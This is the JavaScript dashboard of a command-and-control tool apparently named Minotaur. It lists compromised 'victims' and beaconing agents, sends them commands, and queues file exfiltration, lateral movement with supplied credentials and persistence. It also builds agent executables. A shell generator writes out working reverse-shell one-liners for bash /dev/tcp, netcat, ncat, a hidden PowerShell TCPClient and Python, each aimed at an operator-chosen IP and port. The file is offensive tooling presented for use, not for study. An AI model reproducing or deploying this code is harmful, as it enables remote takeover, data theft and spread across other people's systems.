// Minotaur Dashboard – TCP shells + HTTP agents + activity logs + build agent + auto-persistence
const socket = io();

let savedOutputs = {};

socket.on('connect', () => {
    console.log('[Socket.IO] Connected to Minotaur C2');
});

function escapeHtml(text) {
    if (!text) return '';
    return text.replace(/[&<>]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        return m;
    });
}

// Helper: determine agent online status based on last beacon timestamp (threshold = 90 seconds)
function getAgentStatus(lastBeaconIso, thresholdSeconds = 90) {
    if (!lastBeaconIso) return { text: 'Unknown', color: 'gray' };
    const last = new Date(lastBeaconIso).getTime();
    const now = Date.now();
    const diffSec = (now - last) / 1000;
    if (diffSec <= thresholdSeconds) {
        return { text: 'Online', color: 'green' };
    } else {
        return { text: 'Offline', color: 'red' };
    }
}

// ==================== TAB SWITCHING ====================
$('#tab-tcp').click(function() {
    $('.tab-btn').removeClass('tab-active');
    $(this).addClass('tab-active');
    $('#tcp-section').removeClass('hidden');
    $('#agents-section').addClass('hidden');
    $('#logs-section').addClass('hidden');
    $('#build-section').addClass('hidden');
});
$('#tab-agents').click(function() {
    $('.tab-btn').removeClass('tab-active');
    $(this).addClass('tab-active');
    $('#agents-section').removeClass('hidden');
    $('#tcp-section').addClass('hidden');
    $('#logs-section').addClass('hidden');
    $('#build-section').addClass('hidden');
    loadAgents();
});
$('#tab-logs').click(function() {
    $('.tab-btn').removeClass('tab-active');
    $(this).addClass('tab-active');
    $('#logs-section').removeClass('hidden');
    $('#tcp-section').addClass('hidden');
    $('#agents-section').addClass('hidden');
    $('#build-section').addClass('hidden');
    loadShellLogs();
    loadAgentLogs();
});
$('#tab-build').click(function() {
    $('.tab-btn').removeClass('tab-active');
    $(this).addClass('tab-active');
    $('#build-section').removeClass('hidden');
    $('#tcp-section').addClass('hidden');
    $('#agents-section').addClass('hidden');
    $('#logs-section').addClass('hidden');
});

// Log subtabs
$('#tab-shell-logs').click(function() {
    $('#tab-shell-logs').addClass('border-blue-400 text-blue-400').removeClass('text-gray-400');
    $('#tab-agent-logs').removeClass('border-blue-400 text-blue-400').addClass('text-gray-400');
    $('#shell-logs-panel').removeClass('hidden');
    $('#agent-logs-panel').addClass('hidden');
    loadShellLogs();
});
$('#tab-agent-logs').click(function() {
    $('#tab-agent-logs').addClass('border-blue-400 text-blue-400').removeClass('text-gray-400');
    $('#tab-shell-logs').removeClass('border-blue-400 text-blue-400').addClass('text-gray-400');
    $('#agent-logs-panel').removeClass('hidden');
    $('#shell-logs-panel').addClass('hidden');
    loadAgentLogs();
});

// ==================== MODAL FOR SHELL COMMAND ====================
$('#gen-shell-btn').click(function() {
    $('#shell-modal').css('display', 'block');
    updateShellCommand();
});
$('#close-modal').click(function() {
    $('#shell-modal').css('display', 'none');
});
$(window).click(function(event) {
    if (event.target == document.getElementById('shell-modal')) {
        $('#shell-modal').css('display', 'none');
    }
});
function updateShellCommand() {
    let ip = $('#shell-ip').val();
    let port = $('#shell-port').val();
    let type = $('#shell-type').val();
    let cmd = '';
    if (type === 'bash') {
        cmd = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    } else if (type === 'nc') {
        cmd = `nc -e /bin/bash ${ip} ${port}`;
    } else if (type === 'ncat') {
        cmd = `ncat --ssl ${ip} ${port} -e /bin/bash`;
    } else if (type === 'powershell') {
        cmd = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
    } else if (type === 'python') {
        cmd = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
    }
    $('#shell-output-cmd').val(cmd);
}
$('#shell-ip, #shell-port, #shell-type').on('input change', updateShellCommand);
$('#copy-shell-cmd').click(function() {
    $('#shell-output-cmd').select();
    document.execCommand('copy');
    alert('Command copied to clipboard');
});

// ==================== TCP SHELLS ====================
function saveCurrentOutputs() {
    savedOutputs = {};
    $('.output-box').each(function() {
        const victimId = $(this).attr('id').replace('output-', '');
        savedOutputs[victimId] = $(this).html();
    });
}
function restoreOutputs() {
    for (const [victimId, content] of Object.entries(savedOutputs)) {
        const outputDiv = $(`#output-${victimId}`);
        if (outputDiv.length && content) {
            outputDiv.html(content);
            outputDiv.scrollTop(outputDiv[0].scrollHeight);
        }
    }
}
function loadVictims() {
    saveCurrentOutputs();
    fetch('/api/victims')
        .then(res => res.json())
        .then(data => {
            const tbody = $('#victim-table-body');
            tbody.empty();
            const victimSelect = $('#victim-select');
            victimSelect.empty();
            const outputsContainer = $('#outputs-container');
            outputsContainer.empty();
            data.forEach(v => {
                const shortId = v.id.substring(0, 8);
                const lastSeen = new Date(v.last_seen).toLocaleString();
                const row = $(`
                    <tr class="border-b border-gray-700 bg-gray-800/50">
                        <td class="px-4 py-2 font-mono text-xs">${shortId}</td>
                        <td class="px-4 py-2">${v.hostname} (${v.ip}:${v.port})</td>
                        <td class="px-4 py-2">
                            <span class="px-2 py-1 rounded text-xs ${v.os_type === 'unknown' ? 'bg-gray-600' : v.os_type === 'linux' ? 'bg-blue-800' : v.os_type === 'windows' ? 'bg-green-800' : 'bg-purple-800'}">
                                ${v.os_type}
                            </span>
                        </td>
                        <td class="px-4 py-2 text-xs">${lastSeen}</td>
                        <td class="px-4 py-2">
                            <button class="set-os-btn bg-purple-700 hover:bg-purple-800 text-xs px-2 py-1 rounded" data-id="${v.id}">
                                <i class="fas fa-edit"></i> Override OS
                            </button>
                        </td>
                    </tr>
                `);
                tbody.append(row);
                victimSelect.append(`<option value="${v.id}">${v.hostname} (${v.ip})</option>`);
                const outputDiv = $(`
                    <div class="bg-gray-900 rounded-lg p-3">
                        <div class="text-sm font-mono text-gray-300 mb-2">
                            <i class="fas fa-terminal text-green-400 mr-2"></i> ${v.hostname} (${v.ip})
                            <span class="text-gray-500 text-xs ml-2">ID: ${shortId} | OS: ${v.os_type}</span>
                        </div>
                        <div id="output-${v.id}" class="output-box"></div>
                    </div>
                `);
                outputsContainer.append(outputDiv);
            });
            $('.set-os-btn').off('click').on('click', function() {
                const victimId = $(this).data('id');
                const newOs = prompt("Enter OS type (linux, windows, darwin, unknown):");
                if (newOs && ['linux', 'windows', 'darwin', 'unknown'].includes(newOs.toLowerCase())) {
                    fetch('/api/set_os', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ victim_id: victimId, os_type: newOs.toLowerCase() })
                    }).then(() => loadVictims());
                } else {
                    alert("Invalid OS. Use: linux, windows, darwin, unknown");
                }
            });
            restoreOutputs();
        });
}

// ==================== HTTP AGENTS ====================
function loadAgents() {
    fetch('/api/agents')
        .then(res => res.json())
        .then(agents => {
            const tbody = $('#agents-table-body');
            tbody.empty();
            const agentSelect = $('#agent-select');
            agentSelect.empty();
            agentSelect.append('<option value="">-- Select an agent --</option>');
            agents.forEach(a => {
                const shortId = a.id.substring(0,8);
                const lastBeacon = new Date(a.last_beacon).toLocaleString();
                const status = getAgentStatus(a.last_beacon, 90);
                const statusHtml = `<span class="inline-block w-2 h-2 rounded-full mr-1" style="background-color: ${status.color};"></span>${status.text}`;
                const row = $(`
                    <tr class="border-b border-gray-700 bg-gray-800/50 agent-row">
                        <td class="px-4 py-2 font-mono text-xs">${shortId}</td>
                        <td class="px-4 py-2">${a.hostname}</td>
                        <td class="px-4 py-2">${a.os} / ${a.arch}</td>
                        <td class="px-4 py-2">${a.ip}</td>
                        <td class="px-4 py-2 text-xs">${lastBeacon}</td>
                        <td class="px-4 py-2 text-xs">${statusHtml}</td>
                        <td class="px-4 py-2">
                            <button class="preset-agent-command bg-blue-600 hover:bg-blue-700 text-xs px-2 py-1 rounded" data-id="${a.id}">
                                <i class="fas fa-cog"></i> Preset
                            </button>
                            <button class="shell-agent-btn bg-purple-600 hover:bg-purple-700 text-xs px-2 py-1 rounded ml-1" data-id="${a.id}">
                                <i class="fas fa-terminal"></i> Shell
                            </button>
                            <button class="delete-agent-btn bg-red-600 hover:bg-red-700 text-xs px-2 py-1 rounded ml-1" data-id="${a.id}">
                                <i class="fas fa-trash"></i> Delete
                            </button>
                        </td>
                    </tr>
                `);
                tbody.append(row);
                agentSelect.append(`<option value="${a.id}">${a.hostname} (${a.ip})</option>`);
            });
        });
}
$(document).on('click', '.preset-agent-command', function() {
    const agentId = $(this).data('id');
    const cmdType = prompt("Command type (exec, exfil, lateral, persistence):", "exec");
    if (!cmdType) return;
    let payload = {};
    if (cmdType === 'exec') {
        const command = prompt("Enter command to execute:");
        if (!command) return;
        payload = {command: command};
    } else if (cmdType === 'exfil') {
        const filePath = prompt("Enter absolute file path to exfiltrate:");
        if (!filePath) return;
        payload = {path: filePath};
    } else if (cmdType === 'lateral') {
        const target = prompt("Target IP/hostname:");
        const user = prompt("Username:");
        const password = prompt("Password:");
        const command = prompt("Command to run on target:");
        if (!target || !user || !password || !command) return;
        payload = {target: target, user: user, password: password, command: command};
    } else if (cmdType === 'persistence') {
        payload = {};
    } else {
        alert("Unknown type");
        return;
    }
    fetch('/api/agent/send_command', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({agent_id: agentId, type: cmdType, payload: payload})
    }).then(() => {
        $('#agent-log').prepend(`<div class="text-green-400">→ ${cmdType} command queued for agent ${agentId.substring(0,8)}</div>`);
    }).catch(err => console.error("Error sending preset command:", err));
});
$(document).on('click', '.delete-agent-btn', function() {
    const agentId = $(this).data('id');
    if (confirm(`Permanently delete agent ${agentId.substring(0,8)}? This will also attempt to remove it from the victim system.`)) {
        fetch('/api/agent/delete', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({agent_id: agentId})
        }).then(() => {
            $('#agent-log').prepend(`<div class="text-red-400">🗑️ Agent ${agentId.substring(0,8)} deleted</div>`);
            loadAgents();
        });
    }
});
$(document).on('click', '.shell-agent-btn', function() {
    const agentId = $(this).data('id');
    const c2ip = prompt("Enter C2 IP address (the machine that will receive the shell):", window.location.hostname);
    if (!c2ip) return;
    const port = prompt("Enter port number (must be already open on C2):", "4444");
    if (!port) return;
    fetch('/api/agent/shell', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({agent_id: agentId, ip: c2ip, port: port})
    }).then(() => {
        $('#agent-log').prepend(`<div class="text-purple-400">→ Reverse shell requested to ${c2ip}:${port}</div>`);
    }).catch(err => console.error("Error:", err));
});
$('#clear-all-agents-btn').click(function() {
    if (confirm('⚠️ WARNING: This will permanently delete ALL agents from the database. This action cannot be undone. Continue?')) {
        fetch('/api/agents/clear_all', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        }).then(() => {
            $('#agent-log').prepend('<div class="text-red-400">🗑️ All agents have been cleared from the database.</div>');
            loadAgents();
        }).catch(err => console.error('Error clearing agents:', err));
    }
});
$('#agent-exec-btn').click(() => {
    const agentId = $('#agent-select').val();
    if (!agentId) {
        alert("Please select an agent from the dropdown.");
        return;
    }
    const command = $('#agent-command-input').val();
    if (!command.trim()) return;
    fetch('/api/agent/send_command', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            agent_id: agentId,
            type: 'exec',
            payload: {command: command}
        })
    }).then(() => {
        $('#agent-log').prepend(`<div class="text-blue-400">→ Command "${command}" sent to agent ${agentId.substring(0,8)}</div>`);
        $('#agent-command-input').val('');
    }).catch(err => console.error("Error sending command:", err));
});

// ==================== PORT MANAGEMENT ====================
function loadActivePorts() {
    fetch('/api/active_ports')
        .then(res => res.json())
        .then(ports => {
            const container = $('#active-ports-list');
            container.empty();
            if (ports.length === 0) {
                container.html('<div class="text-gray-500">No ports open. Use "Open New Port" to start listening.</div>');
                return;
            }
            ports.forEach(port => {
                container.append(`
                    <div class="bg-gray-700 rounded-lg px-3 py-1 flex items-center gap-2">
                        <i class="fas fa-door-open text-green-400"></i>
                        <span class="font-mono">${port}</span>
                        <button class="stop-port-btn text-red-400 hover:text-red-300 text-xs" data-port="${port}">
                            <i class="fas fa-stop"></i> Stop
                        </button>
                    </div>
                `);
            });
            $('.stop-port-btn').off('click').on('click', function() {
                const port = $(this).data('port');
                stopListener(port);
            });
            $('#listener-count').text(ports.length);
        });
}
function stopListener(port) {
    fetch('/api/stop_port', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ port: port })
    }).then(() => loadActivePorts());
}
function loadPortEvents() {
    fetch('/api/port_events?limit=30')
        .then(res => res.json())
        .then(events => {
            const logDiv = $('#port-log');
            logDiv.empty();
            if (!events.length) {
                logDiv.html('<div class="text-gray-500">→ no connection events yet</div>');
            } else {
                events.slice().reverse().forEach(e => {
                    logDiv.prepend(`<div class="text-green-400 border-b border-gray-800 py-1">[${new Date(e.timestamp).toLocaleTimeString()}] 🔌 Port ${e.port} → connection from ${e.ip}</div>`);
                });
            }
        });
}
$('#target-select').change(function() {
    if ($(this).val() === 'single') {
        $('#single-target-div').show();
        $('#os-target-div').hide();
    } else {
        $('#single-target-div').hide();
        $('#os-target-div').show();
    }
}).trigger('change');
$('#exec-btn').click(() => {
    const command = $('#command-input').val();
    if (!command.trim()) return;
    const targetType = $('#target-select').val();
    let payload = { target: targetType, command: command };
    if (targetType === 'single') {
        payload.victim_id = $('#victim-select').val();
    } else {
        payload.os_type = $('#os-select').val();
    }
    if (targetType === 'single') {
        const victimId = payload.victim_id;
        const outputDiv = $(`#output-${victimId}`);
        if (outputDiv.length) {
            const time = new Date().toLocaleTimeString();
            outputDiv.append(`<div class="command-separator">--- [${time}] $ ${command} ---</div>`);
            outputDiv.scrollTop(outputDiv[0].scrollHeight);
        }
    }
    fetch('/api/execute', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(err => console.error(err));
});
$('input[name="port-mode"]').change(function() {
    if ($(this).val() === 'single') {
        $('#single-port-input').show();
        $('#range-port-input').hide();
    } else {
        $('#single-port-input').hide();
        $('#range-port-input').show();
    }
});
$('#open-port-btn').click(() => {
    const port = $('#new-port').val();
    if (!port) return;
    fetch('/api/open_port', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ port: parseInt(port) })
    }).then(() => {
        $('#port-log').prepend(`<div class="text-yellow-300">✅ Listening on port ${port}</div>`);
        $('#new-port').val('');
        loadActivePorts();
    });
});
$('#new-port').on('keypress', function(e) {
    if (e.which === 13) {
        e.preventDefault();
        $('#open-port-btn').click();
    }
});
$('#open-range-btn').click(() => {
    const range = $('#port-range').val().trim();
    if (!range) return;
    fetch('/api/open_ports', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ range: range })
    })
    .then(res => res.json())
    .then(results => {
        let successCount = 0, failCount = 0;
        results.forEach(r => {
            if (r.status === 'listening') {
                successCount++;
                $('#port-log').prepend(`<div class="text-yellow-300">✅ Listening on port ${r.port}</div>`);
            } else {
                failCount++;
                $('#port-log').prepend(`<div class="text-red-400">❌ Failed to open port ${r.port}: ${r.error}</div>`);
            }
        });
        $('#port-log').prepend(`<div class="text-blue-300">📡 Opened ${successCount} port(s) (${failCount} failed)</div>`);
        $('#port-range').val('');
        loadActivePorts();
    });
});

// ==================== ACTIVITY LOGS ====================
function loadShellLogs() {
    const victimId = $('#shell-log-filter').val();
    let url = '/api/activity/shell?limit=200';
    if (victimId) url += '&victim_id=' + victimId;
    fetch(url).then(res => res.json()).then(logs => {
        const container = $('#shell-logs-container');
        container.empty();
        logs.forEach(log => {
            const time = new Date(log.timestamp).toLocaleString();
            const prefix = log.direction === 'sent' ? '→' : '←';
            const color = log.direction === 'sent' ? 'text-blue-400' : 'text-green-400';
            if (log.direction === 'sent') {
                container.append(`<div class="${color} mb-1">[${time}] ${prefix} [${log.victim_id.substring(0,8)}] COMMAND: ${log.command}</div>`);
            } else {
                container.append(`<div class="${color} mb-1">[${time}] ${prefix} [${log.victim_id.substring(0,8)}] ${log.output}</div>`);
            }
        });
    });
}
function loadAgentLogs() {
    const agentId = $('#agent-log-filter').val();
    let url = '/api/activity/agent?limit=200';
    if (agentId) url += '&agent_id=' + agentId;
    fetch(url).then(res => res.json()).then(logs => {
        const container = $('#agent-logs-container');
        container.empty();
        logs.forEach(log => {
            const sent = new Date(log.sent_at).toLocaleString();
            const completed = log.completed_at ? new Date(log.completed_at).toLocaleString() : 'pending';
            container.append(`
                <div class="border-b border-gray-700 mb-2 pb-2">
                    <div class="text-yellow-400">[${sent}] Agent ${log.agent_id.substring(0,8)} | Type: ${log.type}</div>
                    <div class="text-gray-400 ml-4">Payload: ${log.payload}</div>
                    <div class="text-green-400 ml-4">Result: ${log.output || log.error || '(no result)'}</div>
                    <div class="text-gray-500 text-xs ml-4">Completed: ${completed}</div>
                </div>
            `);
        });
    });
}
$('#refresh-shell-logs').click(loadShellLogs);
$('#refresh-agent-logs').click(loadAgentLogs);

// ==================== BUILD AGENT ====================
$('#build-agent-btn').click(function() {
    const buildBtn = $(this);
    const statusDiv = $('#build-status');
    statusDiv.removeClass('hidden').html('<div class="text-yellow-400">⏳ Compiling, please wait...</div>');
    buildBtn.prop('disabled', true);

    const data = {
        c2_url: $('#build-c2-url').val(),
        beacon_delay: parseInt($('#build-beacon-delay').val()),
        jitter: parseInt($('#build-jitter').val()),
        user_agent: $('#build-user-agent').val(),
        insecure_tls: $('#build-insecure-tls').is(':checked'),
        auto_persistence: $('#build-auto-persistence').is(':checked'),
        goos: $('#build-goos').val(),
        goarch: $('#build-goarch').val()
    };

    fetch('/api/build_agent', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (!response.ok) return response.json().then(err => { throw err; });
        return response.blob();
    })
    .then(blob => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        let filename = `minotaur_agent_${data.goos}_${data.goarch}`;
        if (data.goos === 'windows') filename += '.exe';
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        a.remove();
        window.URL.revokeObjectURL(url);
        statusDiv.html('<div class="text-green-400">✅ Build successful! Download started.</div>');
    })
    .catch(err => {
        console.error(err);
        statusDiv.html(`<div class="text-red-400">❌ Build failed: ${err.error || err.message || 'Unknown error'}</div>`);
    })
    .finally(() => {
        buildBtn.prop('disabled', false);
        setTimeout(() => statusDiv.addClass('hidden'), 8000);
    });
});

// ==================== SOCKET.IO REAL-TIME ====================
socket.on('new_victim', () => loadVictims());
socket.on('victim_disconnected', () => loadVictims());
socket.on('victim_updated', () => loadVictims());
socket.on('port_connection', (event) => {
    $('#port-log').prepend(`<div class="text-cyan-300">🔔 Port ${event.port} connected from ${event.ip}</div>`);
});
socket.on('shell_output', (data) => {
    const outputDiv = $(`#output-${data.victim_id}`);
    if (outputDiv.length) {
        outputDiv.append(data.line + '\n');
        outputDiv.scrollTop(outputDiv[0].scrollHeight);
    }
});
socket.on('new_agent', () => {
    console.log('[Socket.IO] New agent detected');
    if ($('#agents-section').is(':visible')) loadAgents();
});
socket.on('agent_result', (data) => {
    console.log('[Socket.IO] Agent result received:', data);
    const log = $('#agent-log');
    const prefix = `[Agent ${data.agent_id.substring(0,8)}]`;
    const resultText = data.output || data.error || '(no output)';
    log.prepend(`
        <div class="text-green-300 mb-3 border-b border-gray-700 pb-2">
            <div class="font-bold mb-1">${prefix} Result:</div>
            <pre class="bg-gray-800 p-2 rounded text-xs whitespace-pre-wrap break-words mt-1 max-h-48 overflow-auto">${escapeHtml(resultText)}</pre>
        </div>
    `);
});
socket.on('exfil_received', (data) => {
    $('#agent-log').prepend(`<div class="text-yellow-300 mb-2">📁 Exfiltrated: ${data.file_path} from agent ${data.agent_id.substring(0,8)}</div>`);
});
socket.on('agent_deleted', () => loadAgents());
socket.on('agents_cleared', () => {
    loadAgents();
    $('#agent-log').prepend('<div class="text-red-400">⚠️ Agent list cleared by another operator.</div>');
});

// ==================== INITIAL LOADS ====================
loadVictims();
loadPortEvents();
loadActivePorts();
setInterval(() => {
    loadVictims();
    loadActivePorts();
    if ($('#agents-section').is(':visible')) loadAgents();
}, 30000);